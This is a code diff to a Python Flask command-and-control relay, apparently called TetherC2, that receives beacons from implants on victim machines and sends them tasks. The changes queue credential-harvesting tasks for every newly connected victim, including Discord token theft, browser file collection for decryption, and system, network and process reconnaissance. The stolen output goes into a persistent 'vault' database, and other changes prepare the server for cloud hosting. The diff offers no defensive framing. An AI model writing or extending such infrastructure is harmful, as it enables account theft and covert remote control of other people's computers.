@@ -58,19 +58,31 @@ def handle_implant_hello():
     
     with ses_lock:
         is_new_session = session_id not in active_sessions
-        metadata = {"hostname": data.get("hostname"), "user": data.get("user")}
+        metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
         db.create_or_update_session(session_id, c2_user, metadata)
         active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
         if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
     
+    # This part handles results from background tasks that ride along with the beacon
     if "results" in data:
         for result in data.get("results", []):
             if "command" in result and "output" in result:
                 db.save_vault_data(session_id, result["command"], result["output"])
     
     with cmd_lock:
+        # --- DEFINITIVE FIX FOR SMOOTH OPERATION ---
+        # Instead of a vague 'full_harvest', queue specific, important commands
+        # for a new session. This ensures the UI populates with data immediately.
         if is_new_session:
-            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).append({"action": "full_harvest", "params": {}})
+            initial_tasks = [
+                {"action": "system_info", "params": {}},
+                {"action": "network_info", "params": {}},
+                {"action": "running_processes", "params": {}},
+                {"action": "discord_tokens", "params": {}},
+                {"action": "browser_files", "params": {}} # For decryption
+            ]
+            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).extend(initial_tasks)
+            
         commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
         
     return jsonify({"commands": commands_to_execute})
@@ -78,9 +90,26 @@ def handle_implant_hello():
 @app.route('/implant/response', methods=['POST'])
 def handle_implant_response():
     data = request.json; session_id = data.get("session_id")
-    with ses_lock: session_info = active_sessions.get(session_id)
-    if session_info:
-        with res_lock: response_queue.setdefault(session_info["owner"], {}).setdefault(session_id, []).append(data)
+    if not session_id: return jsonify({"status": "error", "message": "session_id missing"}), 400
+    
+    with ses_lock:
+        session_info = active_sessions.get(session_id)
+        if session_info:
+            # Update last_seen on any communication to keep the session alive
+            active_sessions[session_id]['last_seen'] = time.time()
+            owner = session_info.get("owner")
+            
+    if owner:
+        # Save the response to the persistent database vault
+        module_name = data.get("command")
+        output_data = data.get("output")
+        if module_name and output_data:
+            db.save_vault_data(session_id, module_name, output_data)
+            
+        # Also queue it for the live C2 client
+        with res_lock:
+            response_queue.setdefault(owner, {}).setdefault(session_id, []).append(data)
+            
     return jsonify({"status": "ok"})
 
 # --- C2 Controller Endpoints ---
@@ -97,7 +126,7 @@ def discover_sessions():
     with ses_lock:
         for sid, data in active_sessions.items():
             if data["owner"] == username and (time.time() - data["last_seen"]) < SESSION_TIMEOUT_SECONDS:
-                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"]}
+                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"], "os": data.get("os", "Unknown")}
     return jsonify({"sessions": user_sessions})
     
 @app.route('/c2/get_responses', methods=['POST'])
@@ -117,5 +146,7 @@ def get_all_vault_data():
 def index(): return "TetherC2 Relay is operational."
 
 if __name__ == '__main__':
-    print("[RELAY] TetherC2 Relay is operational.")
-    app.run(host='0.0.0.0', port=5001)
+    # Use environment variable for port, defaulting to 5001, suitable for Render/Heroku
+    port = int(os.environ.get('PORT', 5001))
+    print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
+    app.run(host='0.0.0.0', port=port)
